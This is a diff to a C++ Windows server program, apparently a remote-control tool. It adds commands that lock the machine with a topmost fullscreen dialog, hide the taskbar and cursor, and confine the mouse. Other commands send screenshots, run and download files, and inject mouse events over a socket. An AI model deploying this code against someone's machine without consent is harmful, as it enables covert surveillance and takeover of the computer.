@@ -10,14 +10,11 @@
 #include <io.h>
 #include <list>
 #include <atlimage.h>
+#include "LockDialog.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
-
-
-
-
 
 
 //#pragma warning(disable:4966)
@@ -33,6 +30,9 @@
 CWinApp theApp;
 
 using namespace std;
+
+CLockDialog dlg;
+unsigned threadid = 0;
 
 typedef struct file_info
 {
@@ -57,6 +57,11 @@ int  RunFile();                       //运行文件
 int  DownloadFile();                  //下载文件
 int  MouseEvent();                    //鼠标事件
 int  SendScreen();                    //发送屏幕截图
+int  LockMachine();                   //锁机
+int  UnlockMachine();                 //解锁
+
+unsigned __stdcall threadLockDlg(void* arg); //子线程执行锁机
+
 
 int main()
 {
@@ -100,7 +105,8 @@ int main()
 			    
 			 }
 			  */
-			int nCmd = 6;
+
+			int nCmd = 7;
 			switch (nCmd) {
 			case 1: MakeDriverInfo(); //查看磁盘分区
 				break;
@@ -112,8 +118,13 @@ int main()
 				break;
 			case 5: MouseEvent(); //鼠标操作
 				break;
-			case 6: SendScreen();
-			//发送屏幕内容 ==>发送屏幕截图
+			case 6: SendScreen(); //发送屏幕内容 ==>发送屏幕截图
+				break;
+			case 7: LockMachine(); //锁机
+				break;
+			case 8: UnlockMachine(); //解锁
+				break;
+
 			}
 
 
@@ -367,7 +378,6 @@ int MouseEvent()
 	return 0;
 }
 
-
 int SendScreen()
 {
 	//
@@ -396,10 +406,10 @@ int SendScreen()
 	screena.ReleaseDC();*/
 
 	CImage screen;
-	HDC hScreen = ::GetDC(NULL);
-	int nBitPerPixel = GetDeviceCaps(hScreen, BITSPIXEL);
-	int nWidth = GetDeviceCaps(hScreen, HORZRES);
-	int nHeight = GetDeviceCaps(hScreen, VERTRES);
+	HDC    hScreen      = ::GetDC(NULL);
+	int    nBitPerPixel = GetDeviceCaps(hScreen, BITSPIXEL);
+	int    nWidth       = GetDeviceCaps(hScreen, HORZRES);
+	int    nHeight      = GetDeviceCaps(hScreen, VERTRES);
 	screen.Create(nWidth, nHeight, nBitPerPixel);
 	BitBlt(screen.GetDC(), 0, 0, nWidth, nHeight, hScreen, 0, 0, SRCCOPY);
 	ReleaseDC(NULL, hScreen);
@@ -408,14 +418,14 @@ int SendScreen()
 		return -1;
 	}
 	IStream* pStream = NULL;
-	HRESULT ret = CreateStreamOnHGlobal(hMme, TRUE, &pStream);
-	
+	HRESULT  ret     = CreateStreamOnHGlobal(hMme, TRUE, &pStream);
+
 	if (ret == S_OK) {
 		screen.Save(pStream, Gdiplus::ImageFormatJPEG);
-		LARGE_INTEGER bg = { 0 };
+		LARGE_INTEGER bg = {0};
 		pStream->Seek(bg, STREAM_SEEK_SET,NULL);
-		PBYTE pData = (PBYTE)GlobalLock(hMme);
-		SIZE_T nSize = GlobalSize(hMme);
+		PBYTE   pData = (PBYTE)GlobalLock(hMme);
+		SIZE_T  nSize = GlobalSize(hMme);
 		CPacket pack(6, NULL, nSize);
 		CServerSocket::getInstance()->Send(pack);
 		GlobalUnlock(hMme);
@@ -446,5 +456,77 @@ int SendScreen()
 	pStream->Release();
 	GlobalFree(hMme);
 	screen.ReleaseDC();
+	return 0;
+}
+
+
+int LockMachine()
+{
+	if (dlg.m_hWnd == NULL || dlg.m_hWnd == INVALID_HANDLE_VALUE) {
+		//_beginthread(threadLockDlg, 0, NULL);
+		_beginthreadex(NULL, 0, threadLockDlg, NULL, 0, &threadid);
+	}
+	CPacket pack(7, NULL, 0);
+	CServerSocket::getInstance()->Send(pack);
+	return 0;
+}
+
+int UnlockMachine()
+{
+	//dlg.SendMessage(WM_KEYDOWN, 0x41, 0x01E0001);
+	//::SendMessage(dlg.m_hWnd, WM_KEYDOWN, 0x41, 0x01E0001);
+	PostThreadMessage(threadid, WM_KEYDOWN, 0x41, 0);
+	CPacket pack(8, NULL, 0);
+	CServerSocket::getInstance()->Send(pack);
+	return 0;
+}
+
+unsigned __stdcall threadLockDlg(void* arg)
+{
+	dlg.Create(IDD_DIALOG_INFO, NULL);
+	dlg.ShowWindow(SW_SHOW);
+
+	CRect rect;
+	rect.left = 0;
+	rect.top  = 0;
+
+	//获取屏幕物理像素宽高比
+	HDC hScreen = ::GetDC(NULL);
+	int nWidth  = GetDeviceCaps(hScreen, HORZRES);
+	int nHeight = GetDeviceCaps(hScreen, VERTRES);
+	ReleaseDC(NULL, hScreen);
+
+	rect.right  = nWidth;
+	rect.bottom = nHeight;
+	//rect.right = GetSystemMetrics(SM_CXFULLSCREEN);
+	//rect.bottom = GetSystemMetrics(SM_CYFULLSCREEN);
+	dlg.MoveWindow(rect);
+
+	dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE); //窗口置顶
+
+	ShowCursor(false);                                                //隐藏鼠标
+	::ShowWindow(::FindWindow(TEXT("Shell_TrayWnd"), NULL), SW_HIDE); //隐藏任务栏
+	//限制鼠标活动范围
+	dlg.GetWindowRect(rect);
+	rect.right  = rect.left + 1;
+	rect.bottom = rect.top + 1;
+	ClipCursor(rect);
+
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0)) {
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+		if (msg.message == WM_KEYDOWN) {
+			TRACE("msg:%08X wparam:%08X lparam:%08X\r\n", msg.message, msg.wParam, msg.lParam);
+			if (msg.wParam == 0x1B) {
+				break;
+			}
+		}
+	}
+	
+	::ShowWindow(::FindWindow(TEXT("Shell_TrayWnd"), NULL), SW_SHOW); //显示任务栏
+	ShowCursor(true);
+	dlg.DestroyWindow();//显示鼠标
+	_endthreadex(0);
 	return 0;
 }
